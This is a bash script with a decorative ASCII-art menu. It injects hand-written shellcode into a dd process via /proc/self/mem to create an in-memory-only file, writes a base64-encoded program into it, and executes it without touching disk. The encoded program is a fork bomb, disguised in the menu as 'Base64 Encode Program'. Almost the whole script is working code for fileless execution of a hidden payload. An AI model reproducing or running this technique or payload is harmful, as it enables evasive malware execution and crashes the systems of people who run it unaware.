#!/bin/bash

pause()
{
	read -p "Press [Enter] key to continue..." fackEnterKey
}

clearscreen()
{
	clear
}

make_inmemory_only_file()
{
	pid_address_1=$(setarch x86_64 -R dd if=/proc/self/maps | grep "bin/dd" | head -c 12)
	pid_address_2=$(objdump -Mintel -d `which dd` | grep fclose | tr -d ' ' | grep jmp | cut -c 1-4)
	echo -n -e "\x48\x31\xc0\x48\x31\xff\x66\xbf\x0a\x00\xb8\x20\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\xff\xc7\xb8\x20\x00\x00\x00\x0f\x05\x68\x73\x6f\x43\x78\x48\x89\xe7\xbe\x00\x00\x00\x00\xb8\x3f\x01\x00\x00\x0f\x05\xb8\x22\x00\x00\x00\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05" | setarch x86_64 -R dd of=/proc/self/mem bs=1 seek=$(( 0x$pid_address_1 + 0x$pid_address_2 )) conv=notrunc 10<&0 11<&1 & sudo ls -al /proc/$(pidof dd)/fd/
}

encode_program()
{
	echo "IyEvYmluL2Jhc2gKOigpeyA6fDomIH07Ogo=" | base64 -d > /proc/`pidof dd`/fd/3
}

run_in_memory_only_file()
{
	/proc/`pidof dd`/fd/3 -a
}

mainmenu()
{

	echo "8888888888888888888888888888888888888888888888888888888888888888888888888888"
	echo "8888888888888888888888888888888888888888888888888888888888,---------.8888888"
	echo "888888888888888888888888888888888888888888888888888888888/ o       o \'88888"
	echo "888888888888888888 ____     ____ 88888888888888888888888/  '\     /   \'8888"
	echo "88888888888888888/'    |888|    \'888888888888888888888/     )-8-(     \'888"
	echo "888888888888888/    /  |888| \   \'8888888888888888888/     ( 6 9 )     \'88"
	echo "8888888888888/    /8|  |888|  \   \'88888888888888888/       \ | /       \'8"
	echo "888888888888(   /888|   ***   |\   \'888888888888888/         )=(         \'"
	echo "888888888888| /888/ /^\    /^\  \  _|88888888888888/   o    .--"-"--.    o   \'"
	echo "8888888888888~888| |   |  |   | | ~888888888888888/    I  /  -   -  \  I    \'"
	echo "88888888888888888| |__O|__|O__| |8888888888888.--(    (_}y/\       /\y{_)    )--."
	echo "888888888888888/~~      \/     ~~ \'8888888888(   '.___l'\/__\_____/__\/l___,'    )"
	echo "88888888888888/   (      |      )  \'888888888\                                 /"
	echo "88888888_--_88/,   \____/^\___/'   \88_--_88888'-._      o O o O o O o      _,-'"
	echo "888888/~    ~\8/  -___-|_|_|-___-\  /~    ~\'888888'--Y$(tput setaf 5)--$(tput sgr 0).___________.$(tput setaf 5)--$(tput sgr 0)Y--'88"
	echo "$(tput setaf 6) ____$(tput sgr 0)/$(tput setaf 6)________$(tput sgr 0)|$(tput setaf 6)___$(tput sgr 0)/~~~~|$(tput setaf 6)___$(tput sgr 0)/~~~~\ $(tput setaf 6)__$(tput sgr 0)|$(tput setaf 6)_______$(tput sgr 0)\'88888888|$(tput setaf 5)==$(tput sgr 0).$(tput setaf 2)___________$(tput sgr 0).$(tput setaf 5)==$(tput sgr 0)|88888"
	echo "$(tput setaf 6)|$(tput sgr 0)                |     |   |     |           $(tput setaf 6)|$(tput sgr 0)88888888|$(tput setaf 5)==$(tput sgr 0).$(tput setaf 2)___________$(tput sgr 0).$(tput setaf 5)==$(tput sgr 0)|88888"
	echo "$(tput setaf 6)|$(tput sgr 0)                '^-^-^'   '^-^-^'           $(tput setaf 6)|$(tput sgr 0)88888888'$(tput setaf 5)==$(tput sgr 0).$(tput setaf 2)___________$(tput sgr 0).$(tput setaf 5)==$(tput sgr 0)'88888"
	echo "$(tput setaf 6)|$(tput sgr 0)      $(tput setaf 3)=====$(tput sgr 0) $(tput blink)AVAILABLE CHOICES$(tput sgr 0) $(tput setaf 3)=====$(tput sgr 0)         $(tput setaf 6)|$(tput sgr 0)88888888'$(tput setaf 5)==$(tput sgr 0).$(tput setaf 2)___________$(tput sgr 0).$(tput setaf 5)==$(tput sgr 0)'88888"
	echo "$(tput setaf 6)|$(tput sgr 0)     1 - $(tput setaf 6)Create In-Memory-Only-File$(tput sgr 0)         $(tput setaf 6)|$(tput sgr 0)88888888'$(tput setaf 5)==$(tput sgr 0).$(tput setaf 2)___________$(tput sgr 0).$(tput setaf 5)==$(tput sgr 0)'88888"
	echo "$(tput setaf 6)|$(tput sgr 0)     2 - $(tput setaf 6)Base64 Encode Program$(tput sgr 0)              $(tput setaf 6)|$(tput sgr 0)88888888888888888888888888888888"
	echo "$(tput setaf 6)|$(tput sgr 0)     3 - $(tput setaf 6)Run the In-Memory-Only-File$(tput sgr 0)        $(tput setaf 6)|$(tput sgr 0)8888888 |\ 888 _,,,---,,_ 888888"
	echo "$(tput setaf 6)|$(tput sgr 0)     E - $(tput setaf 6)Exit$(tput sgr 0)                               $(tput setaf 6)|$(tput sgr 0)  ZZZzz /,'.-''    -.  ;-;;,_ 88"
	echo "$(tput setaf 6)|$(tput sgr 0)     $(tput setaf 3)==============================$(tput sgr 0)         $(tput setaf 6)|$(tput sgr 0)888888 |,4-  ) )-,_. ,\ (  ''-'8"
	echo " $(tput setaf 6)____________________________________________$(tput sgr 0) $(tput setaf 2)======$(tput sgr 0)'---''(_/--'$(tput setaf 2)==$(tput sgr 0)'-'|_)$(tput setaf 2)====$(tput sgr 0)"
	echo ""
	echo -n "Enter your choice :"
	read choice
	case $choice in
		"1")
			clearscreen
			make_inmemory_only_file
			pause
			;;
		"2")
			clearscreen
			encode_program
			pause
			;;
		"3")
			clearscreen
			run_in_memory_only_file
			pause
			;;
		[eE])
			clearscreen
			exit
			;;
		*)
		echo "Invalid choice"
			;;
	esac

}

while true; do
	clearscreen
	mainmenu
done